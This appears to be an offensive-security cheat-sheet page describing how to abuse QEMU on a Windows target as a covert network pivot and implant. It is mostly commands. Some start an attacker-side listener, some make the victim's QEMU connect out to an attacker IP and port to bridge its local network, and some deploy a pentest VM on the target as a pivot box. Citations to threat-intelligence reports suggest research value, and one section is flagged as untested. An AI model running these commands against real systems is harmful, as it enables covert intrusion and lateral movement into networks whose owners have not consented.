---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - living-off-the-foreign-land
  - bring-your-own-island
  - cross-platform
---
# QEMU

## Virtual Machine as a Pivot Handler

Launch QEMU server to host a live ISO.

```
$ qemu-system-x86_64 -boot d -cdrom linux-pentest-os.iso -m 6048 -device e1000,netdev=n1,mac=52:54:00:12:34:56 -smp 2 -netdev socket,id=n1,listen=:<attacker_PORT>
```

Let the target establish connection to the attacker's virtual machine server to create a pivoting network to gain initial access.

```
C:\> .\qemu-system-x86_64.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=<attacker_IP>:<attacker_PORT> -netdev hubport,id=port-lan,hubid=0,netdev=lan -netdev hubport,id=port-sock,hubid=0,netdev=sock -nographic

C:\> .\qemu-system-i386.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=<attacker_IP>:<attacker_PORT> -netdev hubport,id=port-lan,hubid=0,netdev=lan -netdev hubport,id=port-sock,hubid=0,netdev=sock -nographic
```

## QEMU Host as a Pivot Handler

TODO: Test this method.

Launch the QEMU as a reverse pivot handler.

```
$ qemu-system-x86_64 -m 512M -device e1000,netdev=n1,mac=52:54:00:12:34:56 -netdev socket,id=n1,listen=:<attacker_PORT> -nographic
```

On the client side establish connection to the attacker's server.

```
C:\> .\qemu-system-i386.exe -m 1M -netdev socket,id=sock,connect=<attacker_IP>:<attacker_PORT> -device e1000,netdev=sock,mac=52:54:00:65:43:21 -nographic

C:\> .\qemu-system-x86_64.exe -m 1M -netdev socket,id=sock,connect=<attacker_IP>:<attacker_PORT> -device e1000,netdev=sock,mac=52:54:00:65:43:21 -nographic
```

## Virtual Machine as an Implant

Deploy your own custom virtual machine as a pivot box.

```
C:\> .\qemu-system-x86_64.exe -drive file=C:\path\to\linux-pentest-os.iso -nographic &

C:\> .\qemu-system-i386.exe -drive file=C:\path\to\linux-pentest-os.iso -nographic &
```

---
## References

### Mandiant

- [Mandiant: Live off the Land? How About Bringing Your Own Island? An Overview of UNC1945](https://cloud.google.com/blog/topics/threat-intelligence/live-off-the-land-an-overview-of-unc1945)

### SecureList

- [SecureList: Network tunneling with… QEMU?](https://securelist.com/network-tunneling-with-qemu/111803/)

### Securonix

- [Securonix: CRON#TRAP - Emulated Linux Environments as the Latest Tactic in Malware Staging](https://www.securonix.com/blog/crontrap-emulated-linux-environments-as-the-latest-tactic-in-malware-staging/)